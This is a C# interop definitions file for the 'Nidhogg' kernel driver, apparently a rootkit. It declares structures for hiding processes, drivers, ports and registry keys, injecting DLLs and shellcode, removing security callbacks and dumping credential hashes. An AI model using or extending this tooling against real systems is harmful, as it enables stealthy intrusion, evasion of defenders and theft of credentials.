using System;
using System.Runtime.InteropServices;

namespace NidhoggCSharpApi
{
    internal partial class NidhoggApi
    {
        public enum NidhoggErrorCodes
        {
            NIDHOGG_SUCCESS,
            NIDHOGG_GENERAL_ERROR,
            NIDHOGG_ERROR_CONNECT_DRIVER,
            NIDHOGG_ERROR_DEVICECONTROL_DRIVER,
            NIDHOGG_INVALID_COMMAND,
            NIDHOGG_INVALID_OPTION,
            NIDHOGG_INVALID_INPUT
        };

        private const uint SYSTEM_PID = 4;
        private const uint MAX_PATH = 260;
        private const uint MAX_PATCHED_MODULES = 256;
        private const uint MAX_FILES = 256;
        private const uint MAX_DRIVER_PATH = 256;
        private const uint MAX_PIDS = 256;
        private const uint MAX_TIDS = 256;
        private const uint MAX_ROUTINES = 64;

        private const uint REG_KEY_LEN = 255;
        private const uint REG_VALUE_LEN = 260;
        private const uint MAX_PORTS = 256;

        enum MODE
        {
            KernelMode,
            UserMode
        };

        enum SignatureType
        {
            PsProtectedTypeNone = 0,
            PsProtectedTypeProtectedLight = 1,
            PsProtectedTypeProtected = 2
        };

        enum SignatureSigner
        {
            PsProtectedSignerNone = 0,      // 0
            PsProtectedSignerAuthenticode,  // 1
            PsProtectedSignerCodeGen,       // 2
            PsProtectedSignerAntimalware,   // 3
            PsProtectedSignerLsa,           // 4
            PsProtectedSignerWindows,       // 5
            PsProtectedSignerWinTcb,        // 6
            PsProtectedSignerWinSystem,     // 7
            PsProtectedSignerApp,           // 8
            PsProtectedSignerMax            // 9
        };

        public enum InjectionType
        {
            APCInjection,
            NtCreateThreadExInjection
        };

        public enum RegItemType
        {
            RegProtectedKey = 0,
            RegProtectedValue = 1,
            RegHiddenKey = 2,
            RegHiddenValue = 3
        };

        public enum CallbackType
        {
            ObProcessType,
            ObThreadType,
            PsCreateProcessTypeEx,
            PsCreateProcessType,
            PsCreateThreadType,
            PsCreateThreadTypeNonSystemThread,
            PsImageLoadType,
            CmRegistryType
        };

        // *********************************************************************************************************

        // ** General Structures ***************************************************************************************
        struct KernelCallback
        {
            public CallbackType Type;
            public ulong CallbackAddress;
            public bool Remove;
        };

        public struct ObCallback
        {
            public IntPtr PreOperation;
            public IntPtr PostOperation;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = (int)MAX_DRIVER_PATH)]
            public string DriverName; // new char[MAX_DRIVER_PATH];
        };

        public struct PsRoutine
        {
            public ulong CallbackAddress;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = (int)MAX_DRIVER_PATH)]
            public string DriverName; //[MAX_DRIVER_PATH];
        };

        public struct CmCallback
        {
            public ulong CallbackAddress;
            public ulong Context;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = (int)MAX_DRIVER_PATH)]
            public string DriverName; //[MAX_DRIVER_PATH];
        };

        public struct RawObCallbacksList
        {
            public CallbackType Type;
            public uint NumberOfCallbacks;
            public IntPtr Callbacks;
        };

        public struct ObCallbacksList
        {
            public CallbackType Type;
            public uint NumberOfCallbacks;
            public ObCallback[] Callbacks;
        };

        public struct RawPsRoutinesList
        {
            public CallbackType Type;
            public uint NumberOfRoutines;
            public IntPtr Routines; // [MAX_ROUTINES];
        };

        public struct PsRoutinesList
        {
            public CallbackType Type;
            public uint NumberOfRoutines;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = (int)MAX_ROUTINES)]
            public PsRoutine[] Routines; // [MAX_ROUTINES];
        };

        public struct CmCallbacksList
        {
            public uint NumberOfCallbacks;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = (int)MAX_ROUTINES)]
            public CmCallback[] Callbacks;
        };

        public struct RawCmCallbacksList
        {
            public uint NumberOfCallbacks;
            public IntPtr Callbacks; // [MAX_ROUTINES];
        };

        struct PatchedModule
        {
            public uint Pid;
            public IntPtr Patch;
            public uint PatchLength;
            public string FunctionName;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string ModuleName; // WCHAR*
        };

        public struct OutputProtectedProcessesList
        {
            public uint PidsCount;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = (int)MAX_PIDS)]
            public uint[] Processes; // [MAX_PIDS];
        };

        public struct OutputThreadsList
        {
            public uint TidsCount;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = (int)MAX_TIDS)]
            public uint[] Threads; //[MAX_TIDS];
        };

        public struct ProcessSignature
        {
            public uint Pid;
            public byte SignerType;
            public byte SignatureSigner;
        };

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct FileItem
        {
            public int FileIndex;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = (int)MAX_PATH)]
            public string FilePath; // [MAX_PATH]; WCHAR
        };

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct RegItem
        {
            public int RegItemsIndex;
            public RegItemType Type;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = (int)REG_KEY_LEN)]
            public string KeyPath;// [REG_KEY_LEN]; WCHAR
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = (int)REG_VALUE_LEN)]
            public string ValueName;// [REG_VALUE_LEN]; WCHAR
        };

        [StructLayout(LayoutKind.Sequential)]
        struct DllInformation
        {
            public InjectionType Type;
            public uint Pid;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = (int)MAX_PATH)]
            public string DllPath; //[MAX_PATH];
        };

        struct ShellcodeInformation
        {
            public InjectionType Type;
            public uint Pid;
            public uint ShellcodeSize;
            public IntPtr Shellcode;
            public IntPtr Parameter1;
            public IntPtr Parameter2;
            public IntPtr Parameter3;
        };

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct HiddenModuleInformation
        {
            public uint Pid;
            public string ModuleName; //wchar
        };

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct HiddenDriverInformation
        {
            public string DriverName; //WCHAR
            public bool Hide;
        };

        public struct ProtectedProcess
        {
            public uint Pid;
            public bool Protect;
        };

        public struct HiddenProcess
        {
            public uint Pid;
            public bool Hide;
        };

        public struct HiddenThread
        {
            public uint Tid;
            public bool Hide;
        };

        public struct ProtectedThread
        {
            public uint Tid;
            public bool Protect;
        };

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct ProtectedFile
        {
            public string FilePath;
            public bool Protect;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
            // _Field_size_bytes_part_opt_(MaximumLength, Length) PWCH Buffer;
        };

        public struct DesKeyInformation
        {
            public uint Size;
            public IntPtr Data;
        };

        public struct Credentials
        {
            public UNICODE_STRING Username;
            public UNICODE_STRING Domain;
            public UNICODE_STRING EncryptedHash;
        };

        public struct OutputCredentials
        {
            public uint Index;
            public Credentials Creds;
        };

        public enum PortType
        {
            TCP = 0,
            UDP
        };

        [StructLayout(LayoutKind.Sequential)]
        public struct InputHiddenPort
        {
            [MarshalAs(UnmanagedType.I1)]
            public bool Hide;
            [MarshalAs(UnmanagedType.I1)]
            public bool Remote;
            public PortType Type;
            public ushort Port;
        };

        public struct HiddenPort
        {
            public bool Remote;
            public PortType Type;
            public ushort Port;
        };

        public struct OutputHiddenPorts
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = (int)MAX_PORTS)]
            public HiddenPort[] Ports; //[MAX_PORTS];
            public ushort PortsCount;
        };

        public struct ScriptInformation
        {
            public IntPtr Script;
            public uint ScriptSize;
        };
    }
}